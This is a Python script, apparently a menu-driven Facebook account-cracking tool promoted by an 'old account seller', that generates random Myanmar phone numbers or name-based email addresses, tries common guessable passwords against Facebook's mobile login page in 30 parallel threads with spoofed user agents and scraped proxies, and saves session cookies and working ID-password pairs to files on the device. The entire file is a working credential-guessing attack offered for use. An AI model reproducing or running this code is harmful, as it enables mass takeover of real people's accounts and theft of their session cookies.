import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('git pull')
loop = 0
oks = []
cps = []
twf =[]
ugen=[]
ugen2=[]
ses=requests.Session()
try:
 pprox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
 open('.pprox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.pprox.txt','r').read().splitlines()




for ua in range(1000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.1.1','6.0','7.1.2','8.1.0','9','10'])
	c='en-US; itel S11Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
	d=random.randrange(40,100)
	e='0'
	f=random.randrange(1000,3000)
	g=random.randrange(10,200)
	j='UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36'
	uaop=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {j}'
	ugen.append(uaop)
	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def main():
    os.system('clear')
    print(logo)
    print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print("  \033[1;32m[\033[1;97m1\033[1;32m]\033[1;97m PHONE NUMBER CRACKING ")
    print("  \033[1;32m[\033[1;97m2\033[1;32m]\033[1;97m GMAIL UID CRACKING ")
    print("  \033[1;32m[\033[1;97m0\033[1;32m]\033[1;31m EXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  [\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        single()    
    if ZWE in ["0","X"]:        
        os.system('exit')


def phone():
                user=[]
                os.system('clear')
                print(logo)
                print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print("\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mEXAMPLE : \033[1;32m[\033[1;97m795\033[1;32m]  [\033[1;97m693\033[1;32m]  [\033[1;97m442\033[1;32m]  \033[1;32m[\033[1;97m785\033[1;32m]  \033[1;32m[\033[1;97m777\033[1;32m]")
                linex()
                code = input('\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97mSELECT SIM CODE :\033[1;32m ')
                os.system('clear')
                print(logo)
                print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print("\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mEXAMPLE : \033[1;32m[\033[1;97m3000\033[1;32m]  [\033[1;97m5000\033[1;32m]  [\033[1;97m10000 , etc...\033[1;32m]")
                linex()
                try:
                        limit=int(input("\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)                               
                with ThreadPool(max_workers=30) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        print(f'\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mTOTAL ID            \033[1;97m┃ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mCRACK CODE          \033[1;97m┃ \033[1;32m'+code+'')
                        print(f"  \033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m\033[1;97 IIf No Result \033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;31mOFF\033[1;97m] \033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for numz in user: 
                                uid = '09'+code+numz
                                pwx = [numz[1:],code+numz[:9],code+numz[:6]]
                                LEE.submit(rcrack,uid,pwx,tl)                                
def single():
                user=[]
                os.system('clear')
                print(logo) 
                print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print("\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mEXAMPLE : \033[1;32m[\033[1;97mwailin\033[1;32m][\033[1;97mzawmyo\033[1;32m][\033[1;97mphyowai\033[1;32m]")
                linex()
                first = input('\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97mSINGLE NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print("\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mEXAMPLE : \033[1;32m[\033[1;97m@gmail.com\033[1;32m][\033[1;97m@yahoo.com\033[1;32m]")
                linex()
                domain = input('\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print("\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mEXAMPLE : \033[1;32m[\033[1;97m3000\033[1;32m][\033[1;97m5000\033[1;32m][\033[1;97m10000\033[1;32m]")
                linex()
                try:
                        limit=int(input("\033[1;32m  [\033[1;97m?\033[1;32m]\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=30) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                        print(f'\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  [\033[1;97m✔\033[1;32m]\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+'')
                        print(f"  \033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+digitx+domain
                                pwx=[digitx+first,first+digitx,first,first+'123',first+'1234',first+'12345',first+'@123',first+'1122']
                                LEE.submit(rcrack,uid,pwx,tl) 
                                     
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            session = requests.Session()
            sys.stdout.write(f'\r\r \033[1;32m[%sZWE-LAY\033[1;32m]\033[1;34m\033[1;32m[\033[38;5;195m%s/%s\033[1;32m]\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'locale': 'en-GB',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO LD7"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            loe = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                cid = "1000"+coki1[0:11]
                print(f'\033[1;96m  [\033[1;92m✔\033[1;96m]\033[1;92m '+cid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;97m  COOKIE : \033[1;37m'+coki)
                linex()
                open('/sdcard/WLO-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                print('\033[1;91m  [✘] '+uid+' ◉ '+ps+'') 
                open('/sdcard/WLO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass


logo =(""" 

  \033[1;97m┏━━━━━━━━━━━━━━━━━━━━━━┓\033[1;97m┏━━━━━━━━━━━━━━━━━━━━━━┓
  \033[1;97m┃\033[0;101m 𝗪𝗔𝗜 𝗟𝗜𝗡 𝗢𝗢 \033[0m  \033[1;31m⦿  \033[1;93m⦿  \033[1;32m⦿ \033[1;97m┃\033[1;97m┃\033[0;104m 𝗠𝗬𝗔𝗡𝗠𝗔𝗥 𝗢𝗟𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 \033[0m\033[1;97m┃
  \033[1;97m┣━━━━━━━━━━━━━━━━━━━━━━┫\033[1;97m┣━━━━━━━━┳━━━━━━━━━━━━━┫
  \033[1;97m┃\033[37m ╔═╗╦ ╦╔═╗  ╦  ╔═╗╦ ╦ \033[1;97m┃\033[1;97m┃\033[1;33mꜱᴛᴀᴛᴜꜱ\033[1;97m  ┃ \033[1;32mᴘʜ+ɢᴍ ᴄʟᴏɴᴇ \033[1;97m┃
  \033[1;97m┃\033[33m ╔═╝║║║║╣   ║  ╠═╣╚╦╝ \033[1;97m┃┣━━━━━━━━╋━━━━━━━━━━━━━┫
  \033[1;97m┃\033[32m ╚═╝╚╩╝╚═╝  ╩═╝╩ ╩ ╩  \033[1;97m┃\033[1;97m┃\033[1;33mᴛᴇʟᴇɢʀᴀᴍ\033[1;97m┃ \033[1;32mᴡᴀɪʟɪɴᴏᴏᴛɢ  \033[1;97m┃
  \033[1;97m┣━━━━━━━━━━━━━━━━━━━━━━┫┣━━━━━━━━╋━━━━━━━━━━━━━┫
  \033[1;97m┃                      ┃\033[1;97m┃\033[33mᴠᴇʀꜱɪᴏɴ\033[0m\033[1;97m ┃ \033[1;32m18+(ᴘᴀɪᴅ)   \033[1;97m┃
  \033[1;97m┃\033[0;104m  𝗙𝗕 𝗢𝗟𝗗 𝗔𝗖𝗖 𝗦𝗘𝗟𝗟𝗘𝗥   \033[0m\033[1;97m┃┣━━━━━━━━╋━━━━━━━━━━━━━┫
  \033[1;97m┃                      ┃┃\033[33mᴄᴏɴᴛᴀᴄᴛ\033[0m\033[1;97m ┃ \033[1;32m09251327232 \033[1;97m┃  
  \033[1;97m┗━━━━━━━━━━━━━━━━━━━━━━┛┗━━━━━━━━┻━━━━━━━━━━━━━┛""")
def linex():
	print(f' \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  
main()
